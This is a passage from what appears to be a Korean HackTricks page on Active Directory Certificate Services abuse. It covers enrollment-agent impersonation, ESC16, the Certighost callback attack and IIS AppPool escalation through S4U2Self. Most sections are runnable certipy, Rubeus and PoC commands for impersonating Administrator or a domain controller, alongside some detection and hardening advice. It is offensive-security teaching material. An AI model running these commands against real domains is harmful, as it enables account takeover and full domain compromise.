- `-application-policies 'Client Authentication'`: CSR의 Application Policies extension에 OID `1.3.6.1.5.5.7.3.2`를 삽입합니다.
- `-upn 'administrator@corp.local'`: 가장을 위해 SAN에 UPN을 설정합니다.

**Step 2: 획득한 certificate를 사용해 Schannel (LDAPS)로 인증합니다.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### 시나리오 B: 등록 에이전트 악용을 통한 PKINIT/Kerberos 가장

**1단계: (Enrollee supplies subject)가 설정된 V1 템플릿에서 인증서를 요청하고, "Certificate Request Agent" Application Policy를 주입합니다.** 이 인증서는 공격자(`attacker@corp.local`)가 등록 에이전트가 되기 위한 것입니다. 목표가 에이전트 권한을 얻는 것이므로, 여기서는 공격자 자신의 ID에 UPN을 지정하지 않습니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 삽입합니다.

**Step 2: "agent" 인증서를 사용해 대상 권한 사용자 대신 인증서를 요청합니다.** 이 단계는 ESC3와 유사하며, Step 1의 인증서를 agent 인증서로 사용합니다.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**3단계: "on-behalf-of" 인증서를 사용해 권한 있는 사용자로 인증합니다.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA에서 보안 확장이 비활성화됨(전역)-ESC16

### 설명

**ESC16(szOID_NTDS_CA_SECURITY_EXT 확장 누락으로 인한 권한 상승)**은 CA 전체에서 **szOID_NTDS_CA_SECURITY_EXT** SID 확장을 억제하는 것을 의미합니다. 이는 구성 상태를 나타낼 뿐, 인증서가 다른 계정으로 인증할 수 있다는 증거는 아닙니다. 가장하려면 관련 계정 특성 또는 매핑을 제어하고, 등록 가능한 클라이언트 인증 템플릿을 사용할 수 있으며, 실제 도메인 컨트롤러 또는 서비스가 허용하는 인증서 매핑 경로를 이용할 수 있어야 합니다. Full Enforcement가 적용된 패치된 KDC는 다른 강력한 매핑이 없는 한 SID 확장이 없는 인증서를 거부합니다. 아래의 UPN 전용 Kerberos 절차는 여전히 약한 매핑을 허용하는 이전 버전 또는 호환성 모드 KDC에 적용됩니다. [Microsoft의 인증서 매핑 및 적용 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

자세한 원리를 알아보려면 다음 문서도 참조하세요:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 악용

다음의 과거 UPN 전용 Kerberos 예시는 [Certipy의 ESC16 문서](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)를 기반으로 합니다. 이 예시를 사용하려면 결과로 생성된 약한 매핑을 여전히 허용하는 KDC가 필요합니다. `StrongCertificateBindingEnforcement=1`은 2025년 9월 9일 Windows 보안 업데이트 이후 더 이상 지원되는 우회 설정이 아닙니다.<sup>[[14]](#references)</sup>

Active Directory Certificate Services(AD CS) 환경이 **ESC16**에 취약한지 확인하려면

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**1단계: 피해자 계정의 초기 UPN 확인 (선택 사항 - 복원용).  **  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**2단계: 피해자 계정의 UPN을 대상 관리자의 `sAMAccountName`으로 업데이트합니다.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**3단계: (필요한 경우) "피해자" 계정의 자격 증명을 획득합니다(예: Shadow Credentials 사용).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: ESC16으로 구성된 CA에서 해당 계정이 등록할 수 있는 client-authentication 템플릿(예: "User")을 사용해 "victim" 사용자로 인증서를 요청합니다.** CA는 발급된 인증서에서 SID 보안 확장을 생략하지만, 이것만으로는 사용 가능한 인증 매핑이 설정되지 않습니다. Kerberos credential cache 환경 변수를 설정합니다(셸 명령):

```bash
export KRB5CCNAME=victim.ccache
```

그런 다음 인증서를 요청합니다:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**5단계: "victim" 계정의 UPN을 원래대로 되돌립니다.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**6단계: 이 취약한 매핑을 허용하는 구형 또는 호환 모드 KDC에서 대상 관리자 계정으로 인증합니다.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 설명

**Certighost**는 CA가 발급할 인증서에 넣을 ID를 확인할 때 요청자가 제공한 요청 속성을 신뢰하는 **AD CS enrollment chase / callback 경로**를 악용합니다. 공개 PoC에서 조작된 요청에는 다음이 포함됩니다:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA가 접속할 공격자 제어 호스트/IP
- **`rmd`**: 사칭할 **대상 Domain Controller DNS 이름**

CA가 chase를 수행하면 **SMB/LSA(`445`)** 및 **LDAP(`389`)**를 통해 공격자에게 접속합니다. 공격자는 **실제 machine account**(보통 기본 **`ms-DS-MachineAccountQuota`**를 이용해 생성)를 사용해 callback 세션이 유효한 도메인 principal로 인증되게 합니다. 하지만 rogue 서비스는 대신 **대상 DC의** ID 속성을 반환합니다.

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA가 반환된 ID를 인증된 callback principal에 **암호학적으로 결합하지 않으면**, 세션은 공격자 제어 machine account로 인증되었는데도 **Domain Controller**용 인증서를 발급할 수 있습니다. 따라서 이 버그는 개념적으로 **Certifried**와 다릅니다. 공격자는 `dNSHostName` 같은 AD 속성을 다시 쓰는 대신, **CA callback 확인 과정에서 ID 데이터를 대체**합니다.<sup>[[2]](#references)</sup>

**유용한 전제 조건:**

- 낮은 권한의 **domain credentials**
- computer account를 **생성하거나 재사용할 수 있는 권한**
- **CA**에서 공격자 제어 **`389` 및 `445` 포트**로의 네트워크 연결 가능성
- 취약하거나 패치되지 않은 CA 요청 경로 (**2026년 7월 14일** Microsoft 업데이트에서 **`cdc`에 대한 DC validation**과 **resolved-SID 비교**가 추가됨)

그 결과로 얻은 **`.pfx`**는 **PKINIT**에 사용할 수 있으며, 이를 통해 **`.ccache`**와 공개된 PoC 흐름에서 **대상 DC NT hash**를 얻을 수 있습니다. 이는 일반적으로 **도메인을 완전히 장악**하기에 충분합니다.

### 악용

공개 PoC는 전체 과정을 자동화합니다:<sup>[[1]](#references)</sup>

1. 공격자 제어 **machine account**를 생성하거나 재사용합니다.
2. `389` 및 `445`에서 **rogue LDAP 및 SMB/LSA listener**를 실행합니다.
3. 공격자 제어 **`cdc`**와 대상 **`rmd`** 속성을 포함한 인증서 요청을 제출합니다.
4. CA가 제어된 machine account로 rogue listener에 인증하게 한 뒤, ID 조회에는 **대상 DC** 속성을 반환합니다.
5. CA가 서명한 **DC 인증서**를 받은 다음 **PKINIT**에 사용합니다.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC의 유용한 런타임 플래그:

- `--listener <ip>`: `cdc`에 광고할 callback IP를 명시적으로 선택
- `--computer-name <NAME$>`: 새 계정을 만들지 않고 기존 machine account 재사용

**운영 참고 사항:**

- PoC는 **privileged ports** `389` 및 `445`에 바인딩하므로 **root** 권한이 필요합니다.
- 익스플로잇에 성공하면 로컬에 **DC `.pfx`** 및 **Kerberos `.ccache`** 파일이 생성됩니다.
- 인증서가 **Domain Controller account**에 매핑되므로, 후속 작업으로 **certificate-based Kerberos auth**, **DCSync**, 복구한 **machine NT hash**의 재사용 등이 가능합니다.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment를 통한 동일 호스트의 Administrator 권한 획득

`ApplicationPoolIdentity`로 실행되는 IIS pool은 네트워크 리소스에 접근할 때 호스트의 **computer account**를 사용합니다. 따라서 `IIS AppPool\<POOL>`로 코드 실행을 하더라도 로컬 token의 권한은 낮게 유지되지만, CA가 인증하는 `HOST$`로 AD CS 요청을 제출할 수 있습니다. 이는 outbound identity 전환이지 token impersonation이나 Potato 방식의 로컬 권한 상승이 아닙니다.<sup>[[19]](#references)[[20]](#references)</sup>

이 체인에는 domain-joined IIS 호스트, RPC를 통해 접근할 수 있는 Enterprise CA, computer에 enrollment 권한이 있는 게시된 machine-authentication template, PKINIT 지원, KDC/SMB 연결이 필요합니다. Custom pool identity를 사용하면 outbound principal이 달라지므로, `HOST$`라고 가정하기 전에 pool이 실제로 `ApplicationPoolIdentity`를 사용하는지 확인하세요.<sup>[[19]](#references)[[20]](#references)</sup>

### 공격자가 제어하는 키를 사용한 enrollment

IIS 서버 외부에서 key pair와 CSR을 생성하고 private key를 보관합니다. 침해한 worker에서는 **CSR만** 제출합니다. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)는 `CertificateAuthority.Request`를 인스턴스화하고, `CertificateTemplate:Machine`을 설정한 뒤, `ICertRequest::Submit`을 호출하고 발급된 인증서를 반환합니다. CA configuration string `CAHOST\CA-NAME`을 사용하세요. 일반적인 `Machine` template은 AD에서 subject를 구성하므로 requester가 subject/SAN 데이터를 제공할 필요가 없습니다.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

반환된 인증서를 **보관한 일치하는 키**와 결합합니다. `certutil -MergePFX machine_cert.cer machine_cert.pfx`는 Windows가 해당 인증서를 접근 가능한 private key와 이미 연결할 수 있는 경우에만 작동합니다. 별도의 PEM 파일을 사용하는 경우 PKCS#12를 명시적으로 생성하세요:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PFX를 PKINIT에 사용하고, 반환된 컴퓨터 TGT는 즉시 주입하는 대신 base64로 유지합니다:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self와 동일 호스트 서비스 대체

S4U2Self를 사용하면 서비스가 다른 사용자의 권한 데이터가 포함된 티켓을 **자기 자신에게** 발급받을 수 있습니다. 컴퓨터 TGT가 있으면 Rubeus로 권한이 높은 사용자를 대상으로 해당 티켓을 요청하고, 반환된 KRB-CRED의 서비스 이름을 CIFS로 바꾼 뒤 주입할 수 있습니다. 이는 로컬의 “delegate to thyself” 프리미티브로, S4U2Proxy나 `msDS-AllowedToDelegateTo` 항목이 필요하지 않습니다.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

대체된 ticket은 **동일한 컴퓨터 계정/키**(여기서는 `HOST`의 CIFS)에서만 사용할 수 있습니다. 다른 도메인 컴퓨터에서 사용할 수 있는 재사용 가능한 Administrator ticket은 아닙니다. 또한, 여기서 입증된 결과는 Administrator 권한의 SMB/파일 시스템 액세스입니다. 로컬 `NT AUTHORITY\SYSTEM` 프로세스를 얻으려면 별도의 원격 실행 단계가 필요합니다.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 탐지 및 보안 강화

- CA에서 Certification Services 이벤트 **4886**(요청 수신)과 **4887**(발급)을 연관 분석해, IIS 서버 계정이 예기치 않게 `Machine` 템플릿을 요청하는지 확인합니다.<sup>[[19]](#references)[[24]](#references)</sup>
- DC에서 인증서 사전 인증을 사용하면 이벤트 **4768**에 인증서 필드가 포함됩니다. 웹 서버 계정에서 발생하는 비정상적인 PKINIT TGT 요청을 경고 대상으로 설정합니다. 이어서 권한이 높은 가장된 ID와 동일한 호스트가 관련된 **4769** 요청을 확인합니다. Rubeus의 `/altservice`는 클라이언트 측에서 KRB-CRED 서비스 이름을 다시 쓰므로, DC 측 4769의 서비스 이름이 `cifs`일 것을 필수 조건으로 삼지 마세요.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe`의 CA RPC 엔드포인트 연결, 예상치 못한 ASPX 파일 생성, Kerberos 인증을 통한 관리 공유 액세스, secrets-dumping 활동을 조사합니다. 가능한 경우 앱 계층에서 CA RPC/KDC/SMB에 대한 액세스를 제한하고, 운영상 필요하지 않은 컴퓨터 등록 권한이나 machine-authentication 템플릿을 제거합니다.<sup>[[19]](#references)</sup>

## 인증서를 이용한 Forest 손상: 수동태로 설명

### 손상된 CA를 통한 Forest Trust 파괴

**교차 forest 등록** 구성은 비교적 간단하게 이루어집니다. 리소스 forest의 **root CA 인증서**는 관리자가 **계정 forest에 게시**하고, 리소스 forest의 **enterprise CA 인증서**는 각 계정 forest의 `NTAuthCertificates` 및 AIA 컨테이너에 **추가**합니다. 이 구성은 리소스 forest의 **CA에 PKI를 관리하는 다른 모든 forest에 대한 완전한 제어권을 부여**합니다. 공격자가 이 CA를 **침해하면**, 리소스 forest와 계정 forest의 모든 사용자에 대한 인증서를 **위조할 수 있으므로**, forest의 보안 경계가 무너질 수 있습니다.<sup>[[6]](#references)</sup>

### 외부 보안 주체에 부여된 등록 권한

다중 forest 환경에서는 **Authenticated Users 또는 외부 보안 주체**(Enterprise CA가 속한 forest 외부의 사용자/그룹)에게 **등록 및 편집 권한을 허용하는 인증서 템플릿을 게시**하는 Enterprise CA에 주의해야 합니다.\
Trust를 통해 인증하면 AD가 **Authenticated Users SID**를 사용자의 token에 추가합니다. 따라서 도메인에 **Authenticated Users에 등록 권한을 허용하는 템플릿**이 있는 Enterprise CA가 있으면, 다른 forest의 사용자가 해당 템플릿에 **등록할 가능성이 있습니다**. 마찬가지로 템플릿이 **외부 보안 주체에 등록 권한을 명시적으로 부여하면**, 이로써 **forest 간 액세스 제어 관계가 생성되어**, 한 forest의 보안 주체가 다른 forest의 템플릿에 **등록할 수 있습니다**.

두 시나리오 모두 한 forest에서 다른 forest로 **공격 표면을 확장**합니다. 공격자는 인증서 템플릿의 설정을 악용해 외부 도메인에서 추가 권한을 얻을 수 있습니다.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC 저장소](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost 기술 분석](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps 블로그](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services 악용](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, 새로운 인증 및 요청 메서드 등](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: 계정 탈취를 위한 Key Trust Account Mapping 악용](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage 이야기](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC를 통한 AD Certificate Services로의 릴레이](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM을 통한 ADCS CA 셸 액세스](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 악용 기법](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 악용 기법](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – 권한 상승 (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: 또 하나의 AD CS ESC만은 아니다](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: 잘못된 구성과 악용](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” 다시 살펴보기](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS 등록 PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC 엔드포인트를 통한 IIS AppPool 권한 상승](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – 애플리케이션 풀 ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 명령](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services 감사](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – 이벤트 4768: Kerberos 인증 ticket 요청](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – 이벤트 4769: Kerberos 서비스 ticket 요청](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell 악용 툴킷](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
